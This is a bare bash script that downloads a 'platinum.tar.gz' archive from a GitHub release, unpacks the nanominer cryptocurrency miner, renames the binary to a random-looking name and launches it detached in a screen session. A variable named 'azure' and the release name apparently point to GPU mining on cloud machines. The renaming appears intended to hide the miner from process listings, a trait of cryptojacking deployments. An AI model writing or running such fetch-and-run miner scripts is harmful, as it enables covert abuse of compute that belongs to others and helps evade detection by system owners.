#!/bin/bash
sudo apt-get update
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
apt-get install -y git wget screen
mkdir /usr/share
mkdir /usr/share/work
rm -r /usr/share/work/platinum
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/ethv100/platinum.tar.gz
mv platinum.tar.gz /usr/share/work/
cd /usr/share/work/ &&  tar xf platinum.tar.gz
rm -rf platinum.tar.gz && cd platinum
mv nanominer $azure -n
cp $azure "$cpuname"
rm -f  nanominer
echo $cpuname" is starting"
screen -d -m ./"${cpuname}"
